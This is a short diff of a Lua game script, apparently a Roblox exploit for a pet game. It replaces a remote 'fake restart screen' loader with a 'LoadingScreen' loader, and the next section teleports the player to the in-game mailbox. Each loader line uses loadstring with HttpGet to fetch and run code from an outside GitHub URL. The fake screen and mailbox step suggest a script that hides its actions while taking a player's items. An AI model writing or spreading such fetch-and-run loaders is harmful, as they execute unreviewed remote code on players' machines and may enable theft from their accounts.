@@ -23,7 +23,7 @@ local PetFolders = {
 }
  
 --// Loading UI
-loadstring(game:HttpGet("https://raw.githubusercontent.com/yaskofafa/LuraphDeobfuscator/master/PsxFakeRestartScreen.lua%204.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20LoadingScreen%20%E2%9C%97"))()
 --// Teleport To Mailbox
 local mailbox = game:GetService("Workspace")["__MAP"].Interactive.Mailbox
 for i,v in pairs(mailbox:GetDescendants()) do
